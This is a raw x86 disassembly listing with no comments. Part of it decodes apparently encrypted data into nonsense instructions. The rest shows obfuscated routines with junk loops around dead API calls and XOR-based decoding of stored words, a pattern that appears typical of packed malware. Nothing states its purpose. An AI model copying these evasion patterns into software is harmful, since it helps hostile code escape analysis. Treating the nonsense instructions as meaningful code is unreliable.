  40f3c2:	sahf   
  40f3c3:	sbb    eax,0x554b7fb6
  40f3c8:	xchg   edi,eax
  40f3c9:	inc    ecx
  40f3ca:	dec    eax
  40f3cb:	lods   eax,DWORD PTR ds:[esi]
  40f3cc:	aaa    
  40f3cd:	shr    BYTE PTR [eax-0x533f6d18],0x78
  40f3d4:	inc    ecx
  40f3d5:	in     al,0x62
  40f3d7:	sti    
  40f3d8:	arpl   WORD PTR [ecx-0x13103704],bp
  40f3de:	(bad)  [edi+0x5242d6b5]
  40f3e4:	or     DWORD PTR [ebp+edi*4+0x1d],0xfffffff1
  40f3e9:	cmp    DWORD PTR [ebp+edx*1+0x60b7815d],0x85aa5962
  40f3f4:	jecxz  0x40f41f
  40f3f6:	(bad)  
  40f3f8:	stos   DWORD PTR es:[edi],eax
  40f3f9:	nop
  40f3fa:	rcl    BYTE PTR [ebx],1
  40f3fc:	mov    ch,al
  40f3fe:	fdiv   st(4),st
  40f400:	call   0x245a:0x52282600
  40f407:	in     eax,dx
  40f408:	int    0x76
  40f40a:	jmp    0xb433:0xbf73c2cf
  40f411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f412:	test   BYTE PTR [edx],al
  40f414:	or     BYTE PTR [esi],dl
  40f416:	push   esp
  40f417:	add    DWORD PTR [ebx],edi
  40f419:	pop    ds
  40f41a:	jge    0x40f3ef
  40f41c:	xor    DWORD PTR [esi-0x5d],ecx
  40f41f:	mov    ecx,0x72eeb28c
  40f424:	ins    BYTE PTR es:[edi],dx
  40f425:	or     dh,BYTE PTR [ecx+0x30f4ddfe]
  40f42b:	loop   0x40f48b
  40f42d:	dec    edi
  40f42e:	jge    0x40f4a1
  40f430:	cmpxchg BYTE PTR [ebx+esi*1-0x3b],bh
  40f435:	add    eax,0x9a625dce
  40f43a:	mov    ss,WORD PTR [ecx+0x6b]
  40f43d:	xchg   esi,eax
  40f43e:	daa    
  40f43f:	adc    eax,0x3cd25089
  40f444:	inc    eax
  40f445:	sahf   
  40f446:	mov    ah,0xe1
  40f448:	and    esi,DWORD PTR [ebx-0x24]
  40f44b:	neg    DWORD PTR [ebx]
  40f44d:	push   ds
  40f44e:	aas    
  40f44f:	ds xchg esi,eax
  40f451:	jmp    0x7719:0xa002df11
  40f458:	dec    ebx
  40f459:	or     dl,cl
  40f45b:	mov    eax,ds:0x42e38b57
  40f460:	add    BYTE PTR [esi-0x57d8d3e7],ch
  40f466:	dec    eax
  40f467:	sub    BYTE PTR [esi],al
  40f469:	lods   eax,DWORD PTR ds:[esi]
  40f46a:	(bad)  
  40f46b:	cmp    eax,0x77397fa9
  40f470:	mov    ch,BYTE PTR [edx+eiz*4-0x224eccfb]
  40f477:	jbe    0x40f45c
  40f479:	std    
  40f47a:	push   ecx
  40f47b:	popf   
  40f47c:	xchg   esp,eax
  40f47d:	stos   BYTE PTR es:[edi],al
  40f47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f47f:	mov    esp,0x795a570f
  40f484:	xchg   esp,eax
  40f485:	shl    DWORD PTR [edi],cl
  40f487:	or     ch,al
  40f489:	sbb    dh,cl
  40f48b:	repnz ss mov ch,0xc8
  40f48f:	pop    eax
  40f490:	call   0xe290ee62
  40f495:	and    BYTE PTR [eax-0xa3f8df6],ch
  40f49b:	jbe    0x40f4b7
  40f49d:	add    eax,0xe8782b11
  40f4a2:	mov    ds:0x23d4405e,al
  40f4a7:	stc    
  40f4a8:	cmc    
  40f4a9:	in     eax,0xb5
  40f4ab:	xor    al,0x40
  40f4ad:	dec    edx
  40f4ae:	shl    edi,0x6a
  40f4b1:	std    
  40f4b2:	aam    0x15
  40f4b4:	pop    ds
  40f4b5:	xchg   ebp,eax
  40f4b6:	sbb    DWORD PTR [ecx],0xffffffc4
  40f4b9:	or     esi,ecx
  40f4bb:	(bad)  
  40f4bd:	pop    edx
  40f4be:	mov    bh,0x21
  40f4c0:	arpl   sp,bx
  40f4c2:	ins    BYTE PTR es:[edi],dx
  40f4c3:	mov    ah,0x96
  40f4c5:	pop    eax
  40f4c6:	add    eax,eax
  40f4c8:	dec    edi
  40f4c9:	fdiv   DWORD PTR [edx-0x17]
  40f4cc:	bound  edx,QWORD PTR [ebx-0x58]
  40f4cf:	fwait
  40f4d0:	push   cs
  40f4d1:	push   ebx
  40f4d2:	push   ecx
  40f4d3:	inc    edx
  40f4d4:	repnz and DWORD PTR [esi],eax
  40f4d7:	xor    DWORD PTR [eax-0x77],edx
  40f4da:	fst    QWORD PTR [edx]
  40f4dc:	adc    DWORD PTR [edx-0x10d662d4],eax
  40f4e2:	ss inc ebp
  40f4e4:	cmp    DWORD PTR [edx+0x345161f1],ecx
  40f4ea:	sbb    dl,BYTE PTR [ebx-0x489c113]
  40f4f0:	shr    BYTE PTR [ecx+edx*2+0x49277e32],0x75
  40f4f8:	jb     0x40f4a8
  40f4fa:	push   es
  40f4fb:	push   esi
  40f4fc:	or     bl,ah
  40f4fe:	mov    esp,0xafd7ce92
  40f503:	rcr    BYTE PTR [ebp-0xc882432],cl
  40f509:	xor    DWORD PTR [ebx],0x76c18d18
  40f50f:	mov    ss,ebx
  40f511:	pop    eax
  40f512:	fwait
  40f513:	inc    ebx
  40f514:	xchg   BYTE PTR [edi+0x3f],dl
  40f517:	cmp    ebp,DWORD PTR [ecx-0x35]
  40f51a:	sbb    DWORD PTR [eax+0x477b4e4],0xffffff91
  40f521:	push   ds
  40f522:	mov    eax,ds:0xaf84a6ac
  40f527:	jno    0x40f4ba
  40f529:	test   DWORD PTR [edi-0x7a],edx
  40f52c:	jg     0x40f554
  40f52e:	fiadd  DWORD PTR [esi+0x712bf5f7]
  40f534:	sub    eax,0x9c18d496
  40f539:	comiss xmm1,DWORD PTR [esi-0x3f]
  40f53d:	ret    
  40f53e:	or     edi,DWORD PTR [eax+0x1c]
  40f541:	push   ebx
  40f542:	lea    ecx,[ecx-0x77]
  40f545:	call   0x63be:0x2a83c544
  40f54c:	lds    ebp,FWORD PTR [esi+0x6d981b7c]
  40f552:	pop    edx
  40f553:	bnd ja 0x40f5ba
  40f556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f557:	xchg   edx,eax
  40f558:	test   al,0x5e
  40f55a:	sub    BYTE PTR [ecx+0x23528488],cl
  40f560:	fnstenv [ecx+eax*4]
  40f563:	push   DWORD PTR [ebx+0x6dae4810]
  40f569:	ins    BYTE PTR es:[edi],dx
  40f56a:	push   0x33b6ee5e
  40f56f:	xchg   edx,eax
  40f570:	ins    BYTE PTR es:[edi],dx
  40f571:	test   BYTE PTR [edi+0x7ea5289c],cl
  40f577:	sbb    BYTE PTR [eax+edi*8],cl
  40f57a:	iret   
  40f57b:	pop    esp
  40f57c:	adc    al,0x3c
  40f57e:	or     cl,ch
  40f580:	fs mov dl,0xbb
  40f583:	pushf  
  40f584:	add    al,0x10
  40f586:	and    al,0xbd
  40f588:	mov    dl,0x29
  40f58a:	adc    ebx,esp
  40f58c:	mov    al,ds:0x109ed986
  40f591:	mov    al,ds:0x57bef901
  40f596:	js     0x40f518
  40f598:	mov    ds:0xdb6b68e8,eax
  40f59d:	sub    al,0x10
  40f59f:	cwde   
  40f5a0:	cmc    
  40f5a1:	sub    BYTE PTR ds:0x2961a041,bh
  40f5a7:	lahf   
  40f5a8:	retf   0xe291
  40f5ab:	ret    0x972
  40f5ae:	jbe    0x40f603
  40f5b0:	cwde   
  40f5b1:	inc    eax
  40f5b2:	aas    
  40f5b3:	and    ebx,DWORD PTR [ebx+0x17441a39]
  40f5b9:	mov    esi,0x9ce128b5
  40f5be:	dec    eax
  40f5bf:	imul   BYTE PTR [esi]
  40f5c1:	(bad)  
  40f5c2:	loopne 0x40f5c6
  40f5c4:	scas   al,BYTE PTR es:[edi]
  40f5c5:	add    BYTE PTR [ebp-0x76],al
  40f5c8:	js     0x40f590
  40f5ca:	inc    ebp
  40f5cb:	and    edi,ebp
  40f5cd:	mov    eax,0xc71ef1af
  40f5d2:	jmp    0x63bdda18
  40f5d7:	es xor al,0xc5
  40f5da:	xchg   BYTE PTR ds:0x823c828f,bl
  40f5e0:	sbb    BYTE PTR [edx-0x6cf8e0e],0xbb
  40f5e7:	jl     0x40f578
  40f5e9:	test   esi,0xb16a9f53
  40f5ef:	outs   dx,DWORD PTR ds:[esi]
  40f5f0:	sbb    BYTE PTR [ecx-0x1d],bl
  40f5f3:	xchg   ebp,eax
  40f5f4:	push   edi
  40f5f5:	call   0x76b3:0xf8151911
  40f5fc:	xor    DWORD PTR ds:0x83f8dda9,esp
  40f602:	lods   al,BYTE PTR ds:[esi]
  40f603:	aaa    
  40f604:	sub    eax,0x8db6ceff
  40f609:	push   0xd82029ed
  40f60e:	mov    WORD PTR [ebx+0x44],ss
  40f611:	mov    cs,WORD PTR [edi-0x677170d8]
  40f617:	cmp    BYTE PTR [edx-0x5b],dh
  40f61a:	mov    edx,0x995dd4a9
  40f61f:	popf   
  40f620:	adc    BYTE PTR [eax+eiz*8-0x3e],ch
  40f624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f625:	mov    ds:0xd2fbf21a,ax
  40f62b:	mov    eax,ds:0x35c0f01d
  40f630:	mov    dl,0x4c
  40f632:	mov    ds:0x9ddf7fbb,al
  40f637:	dec    esp
  40f638:	test   DWORD PTR [ebx-0x7d04b67b],ecx
  40f63e:	add    ecx,DWORD PTR [ebp+0x3d]
  40f641:	shr    DWORD PTR [ecx-0x57],0x5e
  40f645:	sbb    BYTE PTR [ebp+0x373115d7],dl
  40f64b:	push   0xffffffec
  40f64d:	mov    al,ds:0x16d771c4
  40f652:	nop
  40f653:	lock ins DWORD PTR es:[edi],dx
  40f655:	out    dx,eax
  40f656:	das    
  40f657:	pop    esp
  40f658:	push   cs
  40f659:	daa    
  40f65a:	mov    ch,0xc9
  40f65c:	pop    es
  40f65d:	cmc    
  40f65e:	das    
  40f65f:	push   ss
  40f660:	xor    esi,esi
  40f662:	ins    DWORD PTR es:[edi],dx
  40f663:	lods   al,BYTE PTR ds:[esi]
  40f664:	add    DWORD PTR [edi+0x15],ebx
  40f667:	adc    cl,BYTE PTR [edi-0x217eadbd]
  40f66d:	dec    ebx
  40f66e:	into   
  40f66f:	retf   
  40f670:	dec    edi
  40f671:	enter  0xb637,0x90
  40f675:	in     eax,dx
  40f676:	aam    0x7
  40f678:	dec    eax
  40f679:	pusha  
  40f67a:	test   DWORD PTR [esi+0x12],0x903290aa
  40f681:	adc    eax,0xc883f056
  40f686:	mov    dl,0xc1
  40f688:	sub    eax,0x733cd492
  40f68d:	add    BYTE PTR [esi],cl
  40f68f:	jbe    0x40f6a6
  40f691:	dec    esp
  40f692:	push   0x299971d1
  40f697:	clc    
  40f698:	stos   BYTE PTR es:[edi],al
  40f699:	mov    ds:0xc9b54992,al
  40f69e:	imul   ebx,DWORD PTR [edx],0x45
  40f6a1:	(bad)  
  40f6a2:	sbb    al,0xbc
  40f6a4:	sub    dl,BYTE PTR ds:0x76bdc6f6
  40f6aa:	add    al,0x80
  40f6ac:	retf   
  40f6ad:	repnz push cs
  40f6af:	lahf   
  40f6b0:	mov    dl,0x87
  40f6b2:	outs   dx,BYTE PTR ds:[esi]
  40f6b3:	cmp    BYTE PTR [ecx],bl
  40f6b5:	icebp  
  40f6b6:	ds push cs
  40f6b8:	repz mov ecx,0xa45072b2
  40f6be:	mov    eax,ds:0xa0c68742
  40f6c3:	jae    0x40f66e
  40f6c5:	bound  ecx,QWORD PTR [edx-0x4c428b97]
  40f6cb:	xor    eax,0x2f861985
  40f6d0:	jle    0x40f6d7
  40f6d2:	rol    DWORD PTR [edi],cl
  40f6d4:	das    
  40f6d5:	push   ds
  40f6d6:	dec    esi
  40f6d7:	xchg   ecx,eax
  40f6d8:	mov    al,ds:0x46739b80
  40f6dd:	es push ebx
  40f6df:	mov    ds:0x82434dfd,al
  40f6e4:	xor    BYTE PTR [ebp-0x1a9f1082],ch
  40f6ea:	call   0xebb2d8eb
  40f6ef:	xchg   ecx,eax
  40f6f0:	xor    BYTE PTR [edi-0x44058da4],ch
  40f6f6:	lahf   
  40f6f7:	xchg   esp,eax
  40f6f8:	pop    es
  40f6f9:	test   DWORD PTR [ebp+0x41],ebx
  40f6fc:	push   ebp
  40f6fd:	popf   
  40f6fe:	mov    cl,0x89
  40f700:	es test eax,0xeb7df9ad
  40f706:	pop    edi
  40f707:	or     eax,0x655d225c
  40f70c:	mov    eax,ds:0x445f644f
  40f711:	lea    esi,[edi]
  40f713:	xchg   ebp,eax
  40f714:	mov    ecx,0x8866221f
  40f719:	(bad)  
  40f71a:	xchg   ebx,eax
  40f71b:	xor    al,0xa3
  40f71d:	jno    0x40f76c
  40f71f:	push   ss
  40f720:	sti    
  40f721:	adc    dh,BYTE PTR ds:0x91668a03
  40f727:	dec    ecx
  40f728:	mov    edx,0x6322295d
  40f72d:	and    eax,0xf80c0fa1
  40f732:	repnz cmp BYTE PTR [edx],cl
  40f735:	mov    WORD PTR [ebp+0x72],es
  40f738:	ins    DWORD PTR es:[edi],dx
  40f739:	push   ebx
  40f73a:	xor    ah,BYTE PTR [edi-0x64735ae3]
  40f740:	and    DWORD PTR [edx+0x56],0x2062472c
  40f747:	addr16 push eax
  40f749:	jge    0x40f7a7
  40f74b:	imul   edi,ecx,0x4f
  40f74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f74f:	int    0xda
  40f751:	add    esp,eax
  40f753:	xchg   edx,eax
  40f754:	push   eax
  40f755:	xor    ebx,ebx
  40f757:	mov    edx,esp
  40f759:	dec    edx
  40f75a:	inc    ebx
  40f75b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f75e:	dec    ebx
  40f75f:	xor    edx,edx
  40f761:	add    DWORD PTR [ebp-0x10],ebx
  40f764:	pop    ebx
  40f765:	mov    eax,DWORD PTR [ebp-0x10]
  40f768:	pop    edi
  40f769:	pop    esi
  40f76a:	pop    ebx
  40f76b:	leave  
  40f76c:	ret    0x10
  40f76f:	push   ebp
  40f770:	mov    ebp,esp
  40f772:	push   ecx
  40f773:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  40f77a:	mov    ecx,DWORD PTR ds:0x42b26e
  40f780:	mov    edx,DWORD PTR ds:0x42b2da
  40f786:	sub    edx,ecx
  40f788:	xor    ecx,DWORD PTR [ecx+edx*1]
  40f78b:	mov    eax,DWORD PTR [ebp-0x4]
  40f78e:	and    DWORD PTR ds:0x42b226,0x0
  40f798:	mov    edx,DWORD PTR ds:0x42b226
  40f79e:	inc    edx
  40f79f:	mov    DWORD PTR ds:0x42b226,edx
  40f7a5:	cmp    DWORD PTR ds:0x42b226,0xb
  40f7ac:	jb     0x40f7f2
  40f7b2:	jmp    0x40f7cb
  40f7b7:	push   DWORD PTR [ebp-0x24]
  40f7ba:	push   DWORD PTR [ebp-0x24]
  40f7bd:	push   0x42a23f
  40f7c2:	push   DWORD PTR [ebp-0x1c]
  40f7c5:	call   DWORD PTR ds:0x42b306
  40f7cb:	cmp    DWORD PTR ds:0x42b226,0xa
  40f7d2:	jne    0x40f7e5
  40f7d8:	mov    edx,DWORD PTR ds:0x42b226
  40f7de:	inc    edx
  40f7df:	mov    DWORD PTR ds:0x42b226,edx
  40f7e5:	cmp    DWORD PTR ds:0x42b226,0x17
  40f7ec:	jb     0x40f798
  40f7f2:	mov    edx,DWORD PTR [ebp+0x10]
  40f7f5:	mov    ecx,0x75108ae
  40f7fa:	add    DWORD PTR ds:0x42b1ea,0x1734
  40f804:	xor    eax,ecx
  40f806:	add    eax,0x3272f5
  40f80b:	mov    DWORD PTR [edx],eax
  40f80d:	mov    eax,DWORD PTR [ebp+0xc]
  40f810:	xor    eax,ecx
  40f812:	push   esi
  40f813:	mov    esi,DWORD PTR [ebp+0x10]
  40f816:	mov    edx,0x3272f5
  40f81b:	add    eax,edx
  40f81d:	mov    DWORD PTR [esi+0x4],eax
  40f820:	mov    eax,DWORD PTR [ebp+0x14]
  40f823:	mov    esi,DWORD PTR [ebp+0x10]
  40f826:	mov    DWORD PTR [esi+0x8],eax
  40f829:	mov    eax,DWORD PTR [ebp+0x18]
  40f82c:	mov    esi,DWORD PTR [ebp+0x10]
  40f82f:	mov    DWORD PTR [esi+0xc],eax
  40f832:	mov    eax,DWORD PTR [ebp+0x1c]
  40f835:	mov    esi,DWORD PTR [ebp+0x10]
  40f838:	mov    DWORD PTR [esi+0x10],eax
  40f83b:	mov    eax,DWORD PTR [ebp+0x8]
  40f83e:	xor    eax,ecx
  40f840:	add    eax,edx
  40f842:	pop    esi
  40f843:	leave  
  40f844:	ret    0x18
  40f847:	push   ebp
  40f848:	mov    ebp,esp
  40f84a:	sub    esp,0x9c
  40f850:	and    DWORD PTR ds:0x42b1b6,0x0
  40f85a:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f860:	inc    ecx
  40f861:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f867:	cmp    DWORD PTR ds:0x42b1b6,0xd
  40f86e:	ja     0x40f8b2
  40f874:	jmp    0x40f88b
  40f879:	push   0x42a1d7
  40f87e:	push   0x0
  40f880:	push   0x7b23
  40f885:	call   DWORD PTR ds:0x42b30e
  40f88b:	cmp    DWORD PTR ds:0x42b1b6,0xc
  40f892:	jne    0x40f8a5
  40f898:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f89e:	inc    ecx
  40f89f:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f8a5:	cmp    DWORD PTR ds:0x42b1b6,0x14
  40f8ac:	jb     0x40f85a
  40f8b2:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8b5:	xor    eax,DWORD PTR ds:0x42b1a6
  40f8bb:	mov    eax,0x8a9a
  40f8c0:	xor    ax,WORD PTR [ecx+0x20]
  40f8c4:	xor    DWORD PTR ds:0x42b1d6,ebx
  40f8ca:	mov    ecx,0x3b5c
  40f8cf:	adc    DWORD PTR ds:0x42b206,0x42b22e
  40f8d9:	add    ax,cx
  40f8dc:	and    DWORD PTR ds:0x42b1ba,0x0
  40f8e6:	mov    ecx,DWORD PTR ds:0x42b1ba
  40f8ec:	inc    ecx
  40f8ed:	mov    DWORD PTR ds:0x42b1ba,ecx
  40f8f3:	cmp    DWORD PTR ds:0x42b1ba,0x1e
  40f8fa:	jge    0x40f91b
  40f900:	jmp    0x40f90e
  40f905:	push   DWORD PTR [ebp-0x20]
  40f908:	call   DWORD PTR ds:0x42b316
  40f90e:	cmp    DWORD PTR ds:0x42b1ba,0x19
  40f915:	jb     0x40f8e6
  40f91b:	movzx  eax,ax
  40f91e:	or     ecx,DWORD PTR ds:0x42b1fa
  40f924:	mov    DWORD PTR [ebp-0x10],eax
  40f927:	and    DWORD PTR ds:0x42b1a2,0x5305
  40f931:	mov    BYTE PTR [ebp-0x1],0x80
  40f935:	mov    ecx,DWORD PTR ds:0x42b22a
  40f93b:	sub    DWORD PTR ds:0x42b1f6,ecx
  40f941:	lea    eax,[ebp-0x1]
  40f944:	mov    DWORD PTR ds:0x42b21e,0x14
  40f94e:	cmp    DWORD PTR ds:0x42b21e,0x0
  40f955:	je     0x40f9a6
  40f95b:	cmp    DWORD PTR ds:0x42b21e,0x4
  40f962:	ja     0x40f9a6
  40f968:	jmp    0x40f97a
  40f96d:	push   0x5
  40f96f:	push   0x6029
  40f974:	call   DWORD PTR ds:0x42b31a
  40f97a:	cmp    DWORD PTR ds:0x42b21e,0x5
  40f981:	jne    0x40f994
  40f987:	mov    ecx,DWORD PTR ds:0x42b21e
  40f98d:	dec    ecx
  40f98e:	mov    DWORD PTR ds:0x42b21e,ecx
  40f994:	mov    ecx,DWORD PTR ds:0x42b21e
  40f99a:	dec    ecx
  40f99b:	mov    DWORD PTR ds:0x42b21e,ecx
  40f9a1:	jmp    0x40f94e
  40f9a6:	mov    DWORD PTR [ebp-0xc],eax
  40f9a9:	or     ecx,DWORD PTR ds:0x42b212
  40f9af:	mov    al,BYTE PTR [ebp-0x1]
  40f9b2:	xor    DWORD PTR ds:0x42b226,0x485
  40f9bc:	mov    ecx,DWORD PTR [ebp-0xc]
  40f9bf:	xor    al,0x7e
  40f9c1:	add    al,0x3
  40f9c3:	and    DWORD PTR ds:0x42b20a,0x20b6
  40f9cd:	mov    BYTE PTR [ecx],al
  40f9cf:	sbb    ecx,0x5f8e
  40f9d5:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  40f9dc:	push   ebx
  40f9dd:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  40f9e4:	and    DWORD PTR ds:0x42b1da,0x0
  40f9ee:	jmp    0x40f9fe
  40f9f3:	mov    eax,ds:0x42b1da
  40f9f8:	inc    eax
  40f9f9:	mov    ds:0x42b1da,eax
  40f9fe:	cmp    DWORD PTR ds:0x42b1da,0x14
  40fa05:	jae    0x40fa55
  40fa0b:	cmp    DWORD PTR ds:0x42b1da,0xb
  40fa12:	jbe    0x40fa55
  40fa18:	jmp    0x40fa35
  40fa1d:	push   0x42b1f2
  40fa22:	push   DWORD PTR [ebp-0xc]
  40fa25:	push   0x42a000
  40fa2a:	push   0x42a18d
  40fa2f:	call   DWORD PTR ds:0x42b31e
  40fa35:	cmp    DWORD PTR ds:0x42b1da,0xa
  40fa3c:	jne    0x40fa50
  40fa42:	xor    eax,eax
  40fa44:	xor    eax,DWORD PTR ds:0x42b1da
  40fa4a:	inc    eax
  40fa4b:	mov    ds:0x42b1da,eax
  40fa50:	jmp    0x40f9f3
  40fa55:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa58:	sub    DWORD PTR ds:0x42b1fa,0x685a
  40fa62:	push   esi
  40fa63:	dec    esi
  40fa64:	mov    eax,0x75108ae
  40fa69:	and    DWORD PTR ds:0x42b1b2,0x4a0b
  40fa73:	xor    ecx,eax
  40fa75:	or     DWORD PTR ds:0x42b212,ebx
  40fa7b:	mov    esi,0x3272f5
  40fa80:	adc    DWORD PTR ds:0x42b216,0x42b222
  40fa8a:	push   edi
  40fa8b:	and    DWORD PTR ds:0x42b19a,0x42b1a2
  40fa95:	add    ecx,esi
  40fa97:	mov    DWORD PTR ds:0x42b212,0x27f7
  40faa1:	jmp    0x40facf
  40faa6:	mov    DWORD PTR ds:0x42b1a2,0x4c70
  40fab0:	mov    dl,BYTE PTR [ebp-0x1]
  40fab3:	mov    DWORD PTR ds:0x42b1da,0x7ef5
  40fabd:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40fac4:	mov    DWORD PTR ds:0x42b21a,0x736d
  40face:	inc    ecx
  40facf:	mov    DWORD PTR ds:0x42b1b2,0x61ef
  40fad9:	cmp    ecx,0x40
  40fadc:	jb     0x40faa6
  40fae2:	sbb    edx,DWORD PTR ds:0x42b1de
  40fae8:	mov    edx,DWORD PTR [ebp-0x18]
  40faeb:	adc    DWORD PTR ds:0x42b18e,0x3f3e
  40faf5:	xor    edx,eax
  40faf7:	sub    DWORD PTR ds:0x42b1d2,0x42b1ce
  40fb01:	add    edx,esi
  40fb03:	jmp    0x40fbc0
  40fb08:	mov    edi,DWORD PTR [ebp+0x8]
  40fb0b:	mov    ecx,0x8a9a
  40fb10:	sbb    DWORD PTR ds:0x42b1e6,0x42b226
  40fb1a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40fb1f:	adc    DWORD PTR ds:0x42b1de,ecx
  40fb25:	mov    edi,0x3b5c
  40fb2a:	xor    DWORD PTR ds:0x42b1ca,0x42b1a2
  40fb34:	add    cx,di
  40fb37:	adc    DWORD PTR ds:0x42b1b6,0x7f83
  40fb41:	movzx  ecx,cx
  40fb44:	and    DWORD PTR ds:0x42b1f6,0x42b18a
  40fb4e:	mov    DWORD PTR [ebp-0xc],ecx
  40fb51:	and    DWORD PTR ds:0x42b21a,0x0
  40fb5b:	jmp    0x40fb6d
  40fb60:	mov    ecx,DWORD PTR ds:0x42b21a
  40fb66:	inc    ecx
  40fb67:	mov    DWORD PTR ds:0x42b21a,ecx
  40fb6d:	cmp    DWORD PTR ds:0x42b21a,0x19
  40fb74:	jae    0x40fb9c
  40fb7a:	cmp    DWORD PTR ds:0x42b21a,0x1e
  40fb81:	jge    0x40fb9c
  40fb87:	jmp    0x40fb97
  40fb8c:	push   0x1c76
  40fb91:	call   DWORD PTR ds:0x42b322
  40fb97:	jmp    0x40fb60
  40fb9c:	mov    ecx,DWORD PTR [ebp+0x8]
  40fb9f:	add    DWORD PTR ds:0x42b1d2,0x42b1ea
  40fba9:	movzx  ecx,WORD PTR [ecx+edx*4]
  40fbad:	xor    ecx,0x8a9a
  40fbb3:	add    ecx,edi
  40fbb5:	mov    edi,DWORD PTR [ebp-0xc]
  40fbb8:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fbbf:	inc    edx
  40fbc0:	mov    ecx,0xfa9
  40fbc5:	mov    ecx,DWORD PTR [ebp-0x10]
  40fbc8:	cmp    edx,ecx
  40fbca:	jne    0x40fb08
  40fbd0:	mov    DWORD PTR ds:0x42b186,0x1e
  40fbda:	cmp    DWORD PTR ds:0x42b186,0x0
  40fbe1:	je     0x40fc18
  40fbe7:	cmp    DWORD PTR ds:0x42b186,0x24
  40fbee:	jle    0x40fc18
  40fbf4:	jmp    0x40fc04
  40fbf9:	push   0x7864
  40fbfe:	call   DWORD PTR ds:0x42b326
  40fc04:	xor    ecx,ecx
  40fc06:	add    ecx,DWORD PTR ds:0x42b186
  40fc0c:	dec    ecx
  40fc0d:	mov    DWORD PTR ds:0x42b186,ecx
  40fc13:	jmp    0x40fbda
  40fc18:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc1b:	and    edi,edx
  40fc1d:	mov    edx,DWORD PTR [ebp+0x10]
  40fc20:	and    DWORD PTR ds:0x42b19a,0x0
  40fc2a:	mov    edi,DWORD PTR ds:0x42b19a
  40fc30:	inc    edi
  40fc31:	mov    DWORD PTR ds:0x42b19a,edi
  40fc37:	cmp    DWORD PTR ds:0x42b19a,0x25
  40fc3e:	jge    0x40fc76
  40fc44:	jmp    0x40fc69
  40fc49:	push   0x42a0fe
  40fc4e:	push   0x5d6f
  40fc53:	push   0x13cc
  40fc58:	push   DWORD PTR [ebp-0x1c]
  40fc5b:	push   0x3c54
  40fc60:	push   DWORD PTR [ebp-0x20]
  40fc63:	call   DWORD PTR ds:0x42b2ea
  40fc69:	cmp    DWORD PTR ds:0x42b19a,0x1d
  40fc70:	jb     0x40fc2a
  40fc76:	xor    ecx,eax
  40fc78:	inc    edi
  40fc79:	add    ecx,esi
  40fc7b:	and    DWORD PTR ds:0x42b1b6,0x0
  40fc85:	jmp    0x40fc97
  40fc8a:	mov    edi,DWORD PTR ds:0x42b1b6
  40fc90:	inc    edi
  40fc91:	mov    DWORD PTR ds:0x42b1b6,edi
  40fc97:	cmp    DWORD PTR ds:0x42b1b6,0x10
  40fc9e:	jae    0x40fcea
  40fca4:	cmp    DWORD PTR ds:0x42b1b6,0x6
  40fcab:	jl     0x40fcea
  40fcb1:	jmp    0x40fcc9
  40fcb6:	push   0x42a0fe
  40fcbb:	push   DWORD PTR [ebp-0x14]
  40fcbe:	push   0x1
  40fcc0:	push   DWORD PTR [ebp-0x1c]
  40fcc3:	call   DWORD PTR ds:0x42b2ee
  40fcc9:	cmp    DWORD PTR ds:0x42b1b6,0x5
  40fcd0:	jne    0x40fce5
  40fcd6:	xor    edi,edi
  40fcd8:	xor    edi,DWORD PTR ds:0x42b1b6
  40fcde:	inc    edi
  40fcdf:	mov    DWORD PTR ds:0x42b1b6,edi
  40fce5:	jmp    0x40fc8a
  40fcea:	mov    DWORD PTR [edx],ecx
  40fcec:	xor    ecx,ecx
  40fcee:	mov    ecx,DWORD PTR [ebp-0x18]
  40fcf1:	and    DWORD PTR ds:0x42b1e2,0x0
  40fcfb:	xor    edi,edi
  40fcfd:	xor    edi,DWORD PTR ds:0x42b1e2
  40fd03:	inc    edi
  40fd04:	mov    DWORD PTR ds:0x42b1e2,edi
  40fd0a:	cmp    DWORD PTR ds:0x42b1e2,0x29
  40fd11:	ja     0x40fd32
  40fd17:	jmp    0x40fd25
  40fd1c:	push   DWORD PTR [ebp-0x14]
  40fd1f:	call   DWORD PTR ds:0x42b2f2
  40fd25:	cmp    DWORD PTR ds:0x42b1e2,0x19
  40fd2c:	jb     0x40fcfb
  40fd32:	xor    ecx,eax
  40fd34:	and    edi,0x72ff
  40fd3a:	add    ecx,esi
  40fd3c:	or     DWORD PTR ds:0x42b182,0x54fc
  40fd46:	mov    DWORD PTR [ebp-0xc],ecx
  40fd49:	adc    edi,DWORD PTR ds:0x42b1e6
  40fd4f:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  40fd56:	or     edi,DWORD PTR ds:0x42b226
  40fd5c:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40fd63:	and    DWORD PTR ds:0x42b1ba,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ecx,DWORD PTR ds:0x42b1ba
  40fd78:	inc    ecx
  40fd79:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fd7f:	cmp    DWORD PTR ds:0x42b1ba,0x12
  40fd86:	jae    0x40fdca
  40fd8c:	cmp    DWORD PTR ds:0x42b1ba,0x4
  40fd93:	jle    0x40fdca
  40fd99:	jmp    0x40fda9
  40fd9e:	push   0x42b226
  40fda3:	call   DWORD PTR ds:0x42b2f6
  40fda9:	cmp    DWORD PTR ds:0x42b1ba,0x3
  40fdb0:	jne    0x40fdc5
  40fdb6:	xor    ecx,ecx
  40fdb8:	xor    ecx,DWORD PTR ds:0x42b1ba
  40fdbe:	inc    ecx
  40fdbf:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fdc5:	jmp    0x40fd72
